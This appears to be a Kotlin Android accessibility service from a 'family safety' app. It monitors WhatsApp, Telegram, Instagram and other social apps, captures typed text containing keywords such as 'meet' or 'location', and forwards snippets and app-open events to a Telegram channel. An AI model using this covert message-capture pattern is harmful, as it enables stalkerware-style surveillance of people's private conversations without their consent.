package com.family.safety.helper.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import com.family.safety.helper.models.AppUsageData
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class AccessibilityMonitorService : AccessibilityService() {
    
    private lateinit var telegramService: TelegramService
    private val scope = CoroutineScope(Dispatchers.IO)
    private val socialMediaPackages = setOf(
        "com.whatsapp",
        "org.telegram.messenger", 
        "com.facebook.katana",
        "com.instagram.android",
        "com.twitter.android",
        "com.snapchat.android",
        "com.tiktokv.tiktok",
        "com.discord"
    )
    
    override fun onServiceConnected() {
        super.onServiceConnected()
        
        telegramService = TelegramService()
        telegramService.initialize(this)
        
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or 
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                   AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            packageNames = socialMediaPackages.toTypedArray()
        }
        
        serviceInfo = info
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        val packageName = event.packageName?.toString() ?: return
        
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleWindowStateChanged(packageName, event)
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleTextChanged(packageName, event)
            }
        }
    }
    
    private fun handleWindowStateChanged(packageName: String, event: AccessibilityEvent) {
        if (packageName in socialMediaPackages) {
            val className = event.className?.toString() ?: ""
            val appName = getAppName(packageName)
            
            scope.launch {
                telegramService.sendAlert(
                    "📱 App Opened: $appName\n" +
                    "Package: $packageName\n" +
                    "Screen: ${className.substringAfterLast('.')}"
                )
            }
        }
    }
    
    private fun handleTextChanged(packageName: String, event: AccessibilityEvent) {
        if (packageName in socialMediaPackages) {
            val text = event.text?.joinToString(" ") ?: ""
            
            // Monitor for specific keywords that might indicate inappropriate content
            val flaggedKeywords = listOf(
                "meet", "location", "address", "phone", "number"
            )
            
            if (flaggedKeywords.any { keyword -> 
                text.contains(keyword, ignoreCase = true) 
            }) {
                val appName = getAppName(packageName)
                
                scope.launch {
                    telegramService.sendAlert(
                        "⚠️ Flagged Content Detected\n" +
                        "App: $appName\n" +
                        "Context: ${text.take(100)}..."
                    )
                }
            }
        }
    }
    
    private fun getAppName(packageName: String): String {
        return try {
            val applicationInfo = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(applicationInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }
    
    override fun onInterrupt() {
        // Handle service interruption
    }
}
